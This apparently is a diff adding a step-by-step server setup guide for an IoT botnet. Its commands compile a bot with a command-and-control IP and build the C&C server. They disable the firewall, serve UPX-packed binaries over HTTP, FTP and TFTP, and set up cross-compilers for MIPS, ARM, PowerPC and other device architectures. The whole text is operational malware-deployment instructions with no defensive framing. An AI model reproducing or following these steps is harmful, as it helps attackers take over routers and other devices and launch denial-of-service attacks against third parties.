@@ -1,0 +1,46 @@
+[1]
+
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+yum clean all
+
+python build.py bot.c IP goon
+
+gcc cnc.c -o cnc -pthread
+
+iptables -F; service iptables stop
+service httpd restart
+
+[2] Pack with UPX.
+
+chmod +x upx
+./upx --ultra-brute /var/www/html/*
+./upx --ultra-brute /var/ftp/*
+./upx --ultra-brute /var/lib/tftpboot/*
+
+[3][a] Edit typesizes.h
+
+sed -i 's/1024/9999999/g' /usr/include/bits/typesizes.h
+
+[3][b] Increase ulimit
+
+ulimit -n 999999; ulimit -u 999999; ulimit -e 999999
+
+mv /root/cross-compiler-mips /root/Cross-Compilers/
+mv /root/cross-compiler-mipsel /root/Cross-Compilers/
+mv /root/cross-compiler-powerpc /root/Cross-Compilers/
+mv /root/cross-compiler-armv5l /root/Cross-Compilers/
+mv /root/cross-compiler-armv6l /root/Cross-Compilers/
+mv /root/cross-compiler-powerpc-440fp /root/Cross-Compilers/
+mv /root/cross-compiler-i586 /root/Cross-Compilers/
+mv /root/cross-compiler-sh4 /root/Cross-Compilers/
+mv /root/cross-compiler-i686 /root/Cross-Compilers/
+mv /root/cross-compiler-sparc /root/Cross-Compilers/
+mv /root/cross-compiler-m68k /root/Cross-Compilers/
+mv /root/cross-compiler-x86_64 /root/Cross-Compilers/
+mv /root/cross-compiler-armv4l /root/Cross-Compilers/
+mv /root/cross-compiler-armv7l /root/Cross-Compilers/
